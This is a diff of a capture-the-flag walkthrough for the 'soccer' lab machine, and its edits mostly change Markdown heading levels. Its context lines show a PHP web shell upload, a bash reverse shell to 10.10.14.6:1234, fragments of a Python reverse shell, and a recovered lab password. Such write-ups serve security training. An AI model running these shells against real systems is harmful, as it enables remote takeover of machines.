@@ -1,6 +1,6 @@
 ### Host: 10.10.11.194
 
-# Content
+### Content
 
 - Web enumeration
 - Default credentials usage
@@ -8,7 +8,7 @@
 - PHP Web Shell
 - WebSocket Exploitation 
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -100,7 +100,7 @@ As we can see at first glance, this are the files are the ones from the http://s
 ![[Pasted image 20230126100232.png]]
 Unfortunately it is not possible to upload any file on the ROOT (/) directory, so after a tiny little enumeration we identify that /var/www/html/uploads has the right permissions so we upload a simple webshell:
 ![[Pasted image 20230126100521.png]]
-# Exploitation
+### Exploitation
 If we try to do a reverse shell directly from the PHP webshell we'll get some errors since the payload has the "&" special char which is translated as a parameter by the browser, we can send it to burpsuite in order to URL encode it.
 Payload:
 ```bash
@@ -108,7 +108,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.6/1234 0>&1'
 ```
 ![[Pasted image 20230126101047.png]]
 
-# User privesc
+### User Privilege Escalation
 We gain access as www-data user, after some enumeration we identified some interesting entries on the /etc/hosts file:
 ```bash
 www-data@soccer:~/html/tiny/uploads$ cat /etc/hosts
@@ -286,7 +286,7 @@ Table: accounts
 +------+-------------------+----------------------+----------+
 ```
 
-# Root privesc
+### Privilege Escalation
 By running linpeas.sh we identify the following:
 ```bash
 Interesting GROUP writable files (not in Home) (max 500)
@@ -349,20 +349,20 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
-# Post Exploitation
+### Post Exploitation
 
-# Credentials
+### Credentials
 ```bash
 player:PlayerOftheMatch2022
 ```
 
-# Notes
+### Notes
 
 -   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
 -   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
 -   Chisel has some
 
-# Resources:
+### References
 
 
 
